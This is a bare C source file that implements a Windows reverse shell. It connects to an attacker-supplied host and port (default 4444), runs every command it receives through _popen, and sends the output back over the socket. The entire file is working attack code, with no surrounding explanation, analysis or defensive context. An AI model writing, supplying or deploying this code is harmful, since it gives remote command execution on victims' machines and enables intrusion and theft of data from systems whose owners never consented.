#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 4444

void error(const char *msg) {
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[]) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char buffer[1024];
    int bytes_received;

    if (argc < 3) {
        printf("Usage: %s <LHOST> <LPORT>\n", argv[0]);
        return 1;
    }

    const char *lhost = argv[1];
    int lport = atoi(argv[2]);

    if (lport <= 0) {
        lport = DEFAULT_PORT;
    }

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        error("Failed to initialize Winsock");
    }

    // Create a socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        error("Socket creation failed");
    }

    // Set up the server address structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(lhost);
    server.sin_port = htons(lport);

    // Connect to the server
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        error("Connection failed");
    }

    // Communication loop
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        bytes_received = recv(s, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }

        // Execute the command and send the output back
        FILE *fp;
        char result[1024];
        fp = _popen(buffer, "r");
        if (fp == NULL) {
            send(s, "Failed to execute command", 26, 0);
        } else {
            while (fgets(result, sizeof(result), fp) != NULL) {
                send(s, result, strlen(result), 0);
            }
            _pclose(fp);
        }
    }

    // Cleanup
    closesocket(s);
    WSACleanup();
    return 0;
}